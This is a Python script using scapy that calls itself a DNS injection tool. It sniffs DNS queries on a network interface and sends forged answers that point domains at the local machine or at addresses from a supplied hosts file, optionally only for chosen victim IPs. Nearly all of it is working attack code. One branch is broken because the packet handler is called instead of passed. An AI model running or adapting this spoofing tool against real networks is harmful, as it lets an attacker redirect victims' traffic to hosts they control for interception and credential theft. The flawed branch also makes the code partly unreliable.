import argparse
import os
import sys
from scapy.all import *
import logging
import netifaces
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def parse():
	parser = argparse.ArgumentParser(add_help=False, description="DNS injection tool")
	parser.add_argument("-i", metavar="eth0", help="Name of the interface to capture the packet")
	parser.add_argument("-h",metavar="192.168.1.1", help="Forge replies on local machine's ip address")
	parser.add_argument("expression", nargs="*", action="store")
	parser.add_argument('-ip','-?','--ip','-help','--help',action="store_true", help=argparse.SUPPRESS)
	args = parser.parse_args()
	if args.ip:
		parser.print_help()
		sys.exit()
	return args.i, args.h, args.expression

def sniff_pkt(hosts,default_interface,pkt):
    host_flag = 0
    non_host_flag = 0
    if pkt.haslayer(DNSQR) and not pkt[DNS].qr:
        if len(expression) == 0:
            if len(hosts) == 0:
                # print "Spoofing on all observed packets with local machines ip address"
                spoofed_ip = netifaces.ifaddresses(default_interface)[netifaces.AF_INET][0]['addr'].encode()
                # print spoofed_ip
                dom = pkt[DNS].qd.qname
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                      an=DNSRR(rrname=dom,  ttl=10, rdata=spoofed_ip))
                non_host_flag = 1
            else:
                # print "Spoofing on packets only from the specified hosts"
                dom = pkt[DNS].qd.qname.decode()
                # print(dom[:-1])
                # print(hosts)
                # if dom[:-1] in hosts:
                #     print("Yes")
                # print hosts
                if dom[:-1] in hosts:
                    spoofed_ip = hosts[dom[:-1]]
                    print(spoofed_ip)
                    host_flag = 1
                    # print spoofed_ip
                    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                      an=DNSRR(rrname=dom,  ttl=10, rdata=spoofed_ip))
            if host_flag or non_host_flag:
                send(spoofed_pkt)
                # print 'Sent response: ' + pkt[DNS].qd.qname[:-1]  + ' -> ' + spoofed_ip
        else:
            # print(pkt[IP].src)
            # print(expression)
            if pkt[IP].src in expression:
                # print("I am in")
                if len(hosts) == 0:
                    # print "Spoofing on all observed packets with local machines ip address"
                    spoofed_ip = netifaces.ifaddresses(default_interface)[netifaces.AF_INET][0]['addr'].encode()
                    # print spoofed_ip
                    dom = pkt[DNS].qd.qname
                    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                          DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                          an=DNSRR(rrname=dom,  ttl=10, rdata=spoofed_ip))
                    non_host_flag = 1
                else:
                    # print "Spoofing on packets only from the specified hosts"
                    dom = pkt[DNS].qd.qname.decode()
                    # print hosts
                    if dom[:-1] in hosts:
                        spoofed_ip = hosts[dom[:-1]]
                        host_flag = 1
                        # print spoofed_ip
                        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                          DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                          an=DNSRR(rrname=dom,  ttl=10, rdata=spoofed_ip))
                if host_flag or non_host_flag:
                    send(spoofed_pkt)



if __name__ == '__main__':
    interface, hname ,expression = parse()
    hosts = {}
    try:
        if hname:
            with open(hname,'r') as host:
                for line in host:
                    s1,s2 = line.split(" ")
                    hosts[s2[:-1]] = s1
        if expression:
            print("Monitoring on Ip's " + " ".join(expression))
            # pass
        if interface:
            # print interface
            sniff(filter='udp port 53', iface=interface, store=0, prn=sniff_pkt(hosts,None))
        else:
            default_interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
            # print(type(default_interface))
            # print type(default_interface)
            print("Capture on default interfaces")
            sniff(filter = "udp port 53", iface=default_interface, prn=lambda pkt: sniff_pkt(hosts,default_interface,pkt))
            # sniff(filter='udp port 53', iface=default_interface.encode(), store=0, prn=)
    except AttributeError:
        os.system('clear')
        print("Invalid entry/entries")
